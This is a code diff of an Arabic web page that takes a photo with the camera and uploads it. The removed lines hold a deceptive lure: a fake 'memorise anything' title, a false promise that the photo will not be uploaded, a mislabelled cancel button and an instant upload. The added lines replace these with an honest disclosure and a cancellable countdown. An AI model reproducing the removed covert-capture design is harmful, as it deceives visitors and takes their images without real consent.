@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>كيف تحفظ اي شي بخمسة دقائق؟</title>
+<title>(اداة الالتقطات التلقائي)</title>
 <style>
 :root{--bg:#f6f7f9;--card:#fff;--text:#14181f;--muted:#5b6472;--accent:#2563eb;--accent-text:#fff;--border:#dfe3ea;--err:#b42318;--ok:#15803d;
 box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);color-scheme:light}
@@ -32,8 +32,8 @@ button.danger{background:var(--err);color:#fff}
 </head>
 <body>
 <main class="card">
-  <p style="margin:0 0 10px;color:var(--muted);font-size:.95rem">📷 فقط اضغط «سماح» عندما يظهر طلب الكاميرا للمتابعة</p>
-  <h1>التقاط تلقائي</h1>
+  <h1>ستُلتقط صورتك تلقائياً وتُرفع</h1>
+  <p style="margin:0 0 10px;color:var(--muted);font-size:.95rem">📷 عند الموافقة على الكاميرا، ستُلتقط صورة لك فوراً ثم تُرسل لصاحب هذه الصفحة</p>
   <p id="status">لحظات وسيظهر طلب الكاميرا…</p>
   <div class="stage">
     <video id="video" autoplay muted playsinline></video>
@@ -46,8 +46,8 @@ button.danger{background:var(--err);color:#fff}
   </div>
 
   <div id="uploadBox" class="hidden">
-    <p>لن ترفع صورتك على الانترنت لاتخف.. <span id="countdownNum">5</span> ثوانٍ</p>
-    <button class="danger" id="cancelUpload">الموافقة مباشرة</button>
+    <p>سيتم رفع الصورة خلال <span id="countdownNum">5</span> ثوانٍ</p>
+    <button class="danger" id="cancelUpload">إلغاء الرفع</button>
   </div>
 
   <canvas id="canvas" class="hidden"></canvas>
@@ -100,9 +100,13 @@ function capture(){
 }
 
 function startCountdown(){
-  let n=0;countdownNum.textContent=n;uploadBox.classList.remove('hidden');
-  clearTimeout(countdownTimer);
-  countdownTimer=setTimeout(()=>{uploadBox.classList.add('hidden');uploadPhoto();},0);
+  let n=5;countdownNum.textContent=n;uploadBox.classList.remove('hidden');
+  clearInterval(countdownTimer);
+  countdownTimer=setInterval(()=>{
+    n--;
+    if(n<=0){clearInterval(countdownTimer);uploadBox.classList.add('hidden');uploadPhoto();return}
+    countdownNum.textContent=n;
+  },1000);
 }
 
 cancelUploadBtn.addEventListener('click',()=>{
